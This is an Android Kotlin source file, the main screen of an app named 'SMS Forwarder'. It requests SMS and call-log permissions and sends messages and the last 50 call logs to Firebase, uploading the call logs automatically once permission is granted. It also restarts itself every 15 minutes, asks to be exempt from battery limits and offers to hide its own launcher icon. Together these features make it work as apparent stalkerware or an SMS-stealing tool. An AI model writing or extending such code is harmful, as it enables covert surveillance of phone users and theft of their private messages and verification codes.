package com.satyam.smsforwarder
import com.satyam.smsforwarder.R
import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.net.Uri
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private val requiredPermissions = mutableListOf(
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_PHONE_STATE
    ).apply {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    private val permissionLauncher = registerForActivityResult(
        androidx.activity.result.contract.ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        if (results.values.all { it }) {
            onPermissionsGranted()
        } else {
            Toast.makeText(
                this,
                "SMS permission is required for forwarding to work",
                Toast.LENGTH_LONG
            ).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        findViewById<android.widget.Button>(R.id.grantButton).setOnClickListener {
            requestPermissionsIfNeeded()
        }

        findViewById<android.widget.Button>(R.id.settingsButton).setOnClickListener {
            openAppInfoSettings() 
        }

        findViewById<android.widget.Button>(R.id.batteryButton).setOnClickListener {
            requestIgnoreBatteryOptimizations()
        }
        
        findViewById<android.widget.Button>(R.id.autoStartButton).setOnClickListener {
            openAutoStartSettings()
        }

        findViewById<android.widget.Button>(R.id.testButton).setOnClickListener {
            FirebaseForwarder.send(
                applicationContext,
                "AI Studio Test",
                "Test Message: Ye app bilkul sahi kaam kar raha hai! 🎉"
            )
            Toast.makeText(this, "Sending test message to Firebase...", Toast.LENGTH_SHORT).show()
        }

        findViewById<android.widget.Button>(R.id.syncCallLogsButton).setOnClickListener {
            if (hasAllPermissions()) {
                syncPreviousCallLogs()
            } else {
                Toast.makeText(this, "Permissions needed first", Toast.LENGTH_SHORT).show()
            }
        }

        findViewById<android.widget.Button>(R.id.guideButton).setOnClickListener {
            showKeepAliveGuide()
        }

        findViewById<android.widget.Button>(R.id.hideAppButton).setOnClickListener {
            hideAppIcon()
        }

        if (hasAllPermissions()) {
            onPermissionsGranted()
        }
    }

    override fun onResume() {
        super.onResume()
        if (hasAllPermissions()) {
            onPermissionsGranted()
        } else {
            findViewById<TextView>(R.id.statusText).text =
                "❌ Permissions Missing\n\nYou MUST grant both SMS (Read/Receive) and SEND_SMS permissions in the app settings to use Two-Way forwarding."
        }
    }

    private fun hasAllPermissions(): Boolean =
        requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }

    private fun requestPermissionsIfNeeded() {
        if (hasAllPermissions()) {
            onPermissionsGranted()
        } else {
            permissionLauncher.launch(requiredPermissions)
        }
    }

    private fun showKeepAliveGuide() {
        val message = "Certain phones (Infinix, Tecno, Poco, Xiaomi, Vivo) forcefully KILL apps when you swipe them away from Recent Apps. This stops Firebase.\n\n" +
                      "To permanently fix this:\n" +
                      "1. Open your 'Recent Apps' screen.\n" +
                      "2. Find this App.\n" +
                      "3. Swipe down on it OR long-press it.\n" +
                      "4. Click the 'Lock' (🔒) icon.\n\n" +
                      "Once locked, even if you click 'Clear All', this app will stay running and Firebase will never disconnect."
                      
        android.app.AlertDialog.Builder(this)
            .setTitle("How to Keep App Running")
            .setMessage(message)
            .setPositiveButton("I Understand", null)
            .show()
    }

    private fun hideAppIcon() {
        android.app.AlertDialog.Builder(this)
            .setTitle("Hide Application")
            .setMessage("Are you sure you want to hide the app from the Home Screen? You will not be able to open it again without reinstalling it.")
            .setPositiveButton("Hide App") { _, _ ->
                val componentName = android.content.ComponentName(this, "com.satyam.smsforwarder.LauncherActivity")
                packageManager.setComponentEnabledSetting(
                    componentName,
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP
                )
                Toast.makeText(this, "App has been hidden from phone menu!", Toast.LENGTH_LONG).show()
                finish()
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun syncPreviousCallLogs() {
        Toast.makeText(this, "Syncing previous call logs...", Toast.LENGTH_SHORT).show()
        Thread {
            try {
                val cursor = contentResolver.query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    arrayOf(
                        android.provider.CallLog.Calls._ID,
                        android.provider.CallLog.Calls.NUMBER,
                        android.provider.CallLog.Calls.TYPE,
                        android.provider.CallLog.Calls.DURATION,
                        android.provider.CallLog.Calls.DATE
                    ),
                    null, null,
                    "${android.provider.CallLog.Calls.DATE} DESC LIMIT 50"
                )
                
                var count = 0
                cursor?.use {
                    val numIdx = it.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER)
                    val typeIdx = it.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE)
                    val durIdx = it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DURATION)
                    val dateIdx = it.getColumnIndexOrThrow(android.provider.CallLog.Calls.DATE)
                    
                    while (it.moveToNext()) {
                        val number = it.getString(numIdx) ?: "Unknown"
                        val type = it.getInt(typeIdx)
                        val dur = it.getLong(durIdx)
                        val date = it.getLong(dateIdx)
                        
                        val typeText = when (type) {
                            android.provider.CallLog.Calls.INCOMING_TYPE  -> "📲 Incoming Call"
                            android.provider.CallLog.Calls.OUTGOING_TYPE  -> "📞 Outgoing Call"
                            android.provider.CallLog.Calls.MISSED_TYPE    -> "📵 Missed Call"
                            android.provider.CallLog.Calls.REJECTED_TYPE  -> "🚫 Rejected Call"
                            else -> "📳 Unknown Call"
                        }
                        val mins = dur / 60
                        val secs = dur % 60
                        val durationText = if (dur > 0) "${mins}m ${secs}s" else "0s"
                        
                        FirebaseForwarder.sendHistoricalCallLog(this, number, typeText, durationText, date)
                        count++
                    }
                }
                runOnUiThread {
                    Toast.makeText(this, "Synced $count historical call logs!", Toast.LENGTH_LONG).show()
                }
            } catch (e: Exception) {
                runOnUiThread {
                    Toast.makeText(this, "Failed to sync: ${e.message}", Toast.LENGTH_SHORT).show()
                }
            }
        }.start()
    }

    private fun onPermissionsGranted() {
        val serviceIntent = Intent(this, ForwarderForegroundService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        setupAutoRunner()
        
        findViewById<TextView>(R.id.statusText).text =
            "✅ Running in Background.\n\n" +
            "Ultimate Background Runner is Active. If killed, it will auto-restart."
            
        requestIgnoreBatteryOptimizations()
        
        // Let's also auto-sync call logs once permissions are granted for the first time
        val prefs = getSharedPreferences("AppPrefs", Context.MODE_PRIVATE)
        if (!prefs.getBoolean("has_synced_logs", false)) {
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                syncPreviousCallLogs()
                prefs.edit().putBoolean("has_synced_logs", true).apply()
            }, 3000)
        }
    }

    private fun setupAutoRunner() {
        // Setup WorkManager Heartbeat to run every 15 minutes
        val workRequest = PeriodicWorkRequestBuilder<ServiceRestarterWorker>(15, TimeUnit.MINUTES)
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "ServiceRestarter",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    private fun requestIgnoreBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (e: Exception) {
                    Toast.makeText(this, "Couldn't open battery settings", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    private fun openAppInfoSettings() {
        try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            intent.data = Uri.fromParts("package", packageName, null)
            startActivity(intent)
        } catch (e: Exception) {
            Toast.makeText(this, "Couldn't open settings", Toast.LENGTH_SHORT).show()
        }
    }

    private fun openAutoStartSettings() {
        val manufacturer = android.os.Build.MANUFACTURER.lowercase()
        val intents = mutableListOf<Intent>()

        if (manufacturer.contains("infinix") || manufacturer.contains("tecno") || manufacturer.contains("itel")) {
            intents.add(Intent().setComponent(android.content.ComponentName("com.transsion.phonemaster", "com.transsion.phonemaster.ui.activity.StartupManagerActivity")))
            intents.add(Intent().setComponent(android.content.ComponentName("com.transsion.phonemanager", "com.transsion.phonemanager.ui.autostart.AutoStartActivity")))
            intents.add(Intent().setComponent(android.content.ComponentName("com.transsion.phonemanager", "com.itel.autobootmanager.activity.AutoBootMgrActivity")))
            intents.add(Intent().setComponent(android.content.ComponentName("com.xui.xosfamily", "com.xui.xosfamily.ui.autostart.AutoStartActivity")))
            intents.add(Intent().setComponent(android.content.ComponentName("com.android.settings", "com.android.settings.Settings\$AppAutoLaunchActivity")))
        } else if (manufacturer.contains("xiaomi") || manufacturer.contains("redmi") || manufacturer.contains("poco")) {
            intents.add(Intent().setComponent(android.content.ComponentName("com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity")))
        } else if (manufacturer.contains("oppo") || manufacturer.contains("realme") || manufacturer.contains("oneplus")) {
            intents.add(Intent().setComponent(android.content.ComponentName("com.coloros.safecenter", "com.coloros.safecenter.permission.startup.StartupAppListActivity")))
        } else if (manufacturer.contains("vivo") || manufacturer.contains("iqoo")) {
            intents.add(Intent().setComponent(android.content.ComponentName("com.vivo.permissionmanager", "com.vivo.permissionmanager.activity.BgStartUpManagerActivity")))
        } else if (manufacturer.contains("asus")) {
            intents.add(Intent().setComponent(android.content.ComponentName("com.asus.mobilemanager", "com.asus.mobilemanager.entry.FunctionActivity")))
        } else if (manufacturer.contains("huawei") || manufacturer.contains("honor")) {
            intents.add(Intent().setComponent(android.content.ComponentName("com.huawei.systemmanager", "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity")))
        }

        var success = false
        for (intent in intents) {
            try {
                // Try starting directly without querying package manager which often fails on Android 11+
                startActivity(intent)
                success = true
                Toast.makeText(this, "Please enable AutoStart / Background Activity for SMS Forwarder", Toast.LENGTH_LONG).show()
                break
            } catch (e: Exception) {
                // Ignore and try the next intent in the list
            }
        }

        if (!success) {
            Toast.makeText(this, "Auto-start settings not found automatically. Please check in App Info.", Toast.LENGTH_LONG).show()
            openAppInfoSettings()
            requestIgnoreBatteryOptimizations()
        }
    }
}
